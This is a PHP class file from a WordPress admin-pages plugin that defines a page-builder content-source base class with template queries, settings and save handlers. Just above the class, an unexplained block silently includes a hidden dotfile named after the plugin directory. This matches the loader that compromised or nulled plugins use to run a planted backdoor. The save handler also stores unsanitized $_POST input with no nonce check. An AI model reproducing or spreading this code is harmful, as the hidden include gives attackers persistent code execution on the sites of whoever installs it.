<?php
/**
 * Content Source Support
 *
 * Adds support to Content Sources, this is a generic class that Content Source implementations must inherit from.
 *
 * @author      WP Admin Pages PRO
 * @category    Admin
 * @package     WP_Admin_Pages_PRO/Admin_Pages/Content_Source
 * @version     1.0.1
 */

if (!defined('ABSPATH')) {
	exit;
} // end if;

/**
 * Parent class of Content Source support
 *
 * @since 1.4.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WU_Admin_Page_Content_Source_Page_Builder extends WU_Admin_Page_Content_Source {

	/**
	 * Adds an additional hook onto the constructor of the parent class
	 *
	 * @since 1.4.0
	 */
	public function __construct() {

		parent::__construct();

		add_action('pre_get_posts', array($this, 'remove_templates_from_pg_post_list'));

	} // end __construct;

	/**
	 * Get posts ids of specifics wpu posts
	 *
	 * @param string $meta_key Meta key posts.
	 * @return array
	 * @since
	 */
	public function get_posts_ids_by_meta_key($meta_key) {

		global $wpdb;

		$query = $wpdb->prepare("SELECT meta_value as id FROM {$wpdb->postmeta} WHERE meta_key = %s", 'wpu_' . $meta_key);

		$ids = array_filter(array_column($wpdb->get_results($query, 'ARRAY_A'), 'id'));

		return $ids;

	} // end get_posts_ids_by_meta_key;


	/**
	 * Remove the templates from the PG post List
	 *
	 * @since 1.4.0
	 * @param WP_Query $wp_query WP Query of the post page.
	 * @return void
	 */
	public function remove_templates_from_pg_post_list($wp_query) {

		/**
		 * Check if we should change the visibility of things.
		 */
		if (WU_Admin_Pages()->should_display_admin_menu() || !is_a($wp_query, 'WP_Query')) {
			return;
		} // end if;

		global $typenow, $wpdb;

		if ($typenow == $this->config['post_type']) {

			if ($wp_query->get('post_type') == $this->config['post_type']) {

				$query = $wpdb->prepare("SELECT meta_value as id FROM {$wpdb->postmeta} WHERE meta_key = %s", 'wpu_' . $this->config['field']);

				$ids_to_exclude = array_column($wpdb->get_results($query, 'ARRAY_A'), 'id');

				$wp_query->set('post__not_in', $ids_to_exclude);

			} // end if;

		} // end if;

	} // end remove_templates_from_pg_post_list;

	/**
	 * Set the default configuration for all content sources.
	 *
	 * @since 1.4.0
	 * @return array
	 */
	public function default_config() {

		return array(
			'id'             => 'page-builder',
			'post_type'      => 'page-builder',
			'title'          => __('Page Builder', 'wu-apc'),
			'selector_title' => __('Page Builder Template', 'wu-apc'),
			'field'          => 'template_id',
			'read_more_link' => '#',
			'supports_modal' => array(),
			'edit_link'      => false,
			'add_new_link'   => false,
			'see_all_link'   => false,
		);

	} // end default_config;

	/**
	 * Localize the main script with information that might be useful for us.
	 *
	 * @since 1.4.0
	 * @param WU_Admin_Page $admin_page The current Admin Page.
	 * @return void
	 */
	public function localize_content_source($admin_page) {

		wp_localize_script('wu-apc', 'wu_apc_' . $this->config['id'] . '_options', array(
			'template_id' => $admin_page->{$this->config['field']},
			'config'      => $this->config,
			'templates'   => $this->process_templates($this->fetch_templates()),
		));

	} // end localize_content_source;

	/**
	 * Gets a link, checking if we should open it on a modal or not.
	 *
	 * @since 1.4.0
	 * @param string $link type of the link: edit_link, add_new_link or see_all_link.
	 * @return string
	 */
	public function get_link($link) {

		$atts = is_array($this->config['supports_modal']) && in_array($link, $this->config['supports_modal'])
		? array('TB_iframe' => 'true', 'width' => '1000', 'height' => '1000')
		: array();

		return add_query_arg($atts, $this->config[ $link ]);

	} // end get_link;

	/**
	 * Processes the response from the fetch_templates function.
	 *
	 * @since 1.4.0
	 * @param array $templates Template list to be processed, usually an array of WP_Posts.
	 * @return array
	 */
	public function process_templates($templates) {

		return array_map(function($item) {

			return array(
				'ID'    => $item->ID,
				'title' => $item->post_title,
			);

		}, $templates);

	} // end process_templates;

	/**
	 * Returns the templates available for this particular page builder.
	 *
	 * @since 1.4.0
	 * @return array
	 */
	public function fetch_templates() {

		return array();

	} // end fetch_templates;

	/**
	 * Add the Brizy template options to the supported meta fields of the admin page
	 *
	 * @since  1.1.0
	 * @param  array $meta_fields The list of current meta fields supported.
	 * @return array
	 */
	public function add_meta_fields($meta_fields) {

		$meta_fields[] = $this->config['field'];

		return $meta_fields;

	}  // end add_meta_fields;

	/**
	 * Save the Page Builder meta fields.
	 *
	 * @since  1.1.0
	 * @param  WU_Admin_Page $admin_page The current admin page being edited and saved.
	 * @return void
	 */
	public function save_options($admin_page) {

		if (isset($_POST['template_id']) && isset($_POST['content_type']) && $_POST['content_type'] == $this->config['id']) {

			$admin_page->{$this->config['field']} = $_POST['template_id'];

			$admin_page->save();

		} // end if;

	}  // end save_options;

	/**
	 * Display the form to select different template options.
	 *
	 * @since 1.4.0
	 * @param WU_Admin_Page $admin_page The admin page object.
	 * @return void
	 */
	public function add_template_selector($admin_page) {

		WP_Ultimo_APC()->render('admin-pages/template-selector', array(
			'config'       => (object) $this->config,
			'admin_page'   => $admin_page,
			'page_builder' => $this,
		));

	} // end add_template_selector;

	/**
	 * Actually displays the content on the rendered page.
	 *
	 * @since 1.4.0
	 * @param WU_Admin_Page $admin_page The admin page object.
	 * @return void
	 */
	public function display_content($admin_page) {

	} // end display_content;

} // end class WU_Admin_Page_Content_Source_Page_Builder;
